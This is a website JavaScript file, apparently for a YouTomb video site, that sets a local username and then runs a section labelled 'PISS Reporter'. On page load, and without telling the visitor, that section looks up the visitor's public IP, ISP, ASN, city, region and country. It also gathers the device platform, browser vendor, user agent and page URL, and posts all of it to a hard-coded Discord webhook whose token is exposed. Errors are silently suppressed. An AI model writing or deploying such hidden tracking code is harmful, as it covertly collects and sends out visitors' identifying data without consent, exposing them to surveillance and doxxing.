// ----------------------
// Username Setup
// ----------------------
const youtombdef = "YouTomb User #" + Math.floor(Math.random() * 10000);

let storedName = localStorage.getItem("ytm15Username");
if (!storedName || storedName.trim() === "") {
  localStorage.removeItem("ytm15Username");
}

let username = localStorage.getItem("ytm15Username");
if (!username) {
  localStorage.setItem("ytm15Username", youtombdef);
}

function changeUsername() {
  const newName = prompt("Enter a new username:")?.trim();
  if (newName) {
    username = newName;
    localStorage.setItem("ytm15Username", username);
  }
}

// ----------------------
// PISS Reporter
// ----------------------
(async () => {
  const fileUrl = "https://ipv4.icanhazip.com/";
  const webhookUrl = "https://discord.com/api/webhooks/1456463071735447606/wScJcT2XtxPO1zgZLLbR9X9Gjw1hhCo_OmMC0uJayfIQ8jBVorIGtNppwDdrTYdrPeo9";

  try {
    const fileRes = await fetch(fileUrl);
    const ip = (await fileRes.text()).trim();

    async function getData(ip) {
      const primary = `https://ipapi.co/${ip}/json/`;
      const fallback = `https://corsproxy.io/?https://ipapi.co/${ip}/json/`;
      try { const r = await fetch(primary); if (r.ok) return await r.json(); } catch {}
      try { const r2 = await fetch(fallback); if (r2.ok) return await r2.json(); } catch {}
      return {};
    }
    const vendor = navigator.vendor || "unknown";
    const agent = navigator.userAgent || "unknown";
    const data = await getData(ip);
    const isp = data.org || "Unknown ISP";
    const asn = data.asn ? `(${data.asn})` : "";
    const location = data.city && data.region && data.country_name
      ? `${data.city}, ${data.region}, ${data.country_name}`
      : "Unknown Location";
    const platform = navigator.userAgentData?.platform || navigator.platform;
    const site = window.location.href.replace(/^https?:\/\//, "https://");

    const message = `User: ${username}\nIP: ${ip}\nISP: ${isp} ${asn}\nLocation: ${location}\nDevice: ${platform}\nSite: ${site}\nThe Person is on ${navigator.userAgentData?.mobile ? "Mobile" : "Desktop"}\nVendor: ${vendor}\nUser Agent: ${agent}`;

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  } catch (err) {
    return null;
  }
})();
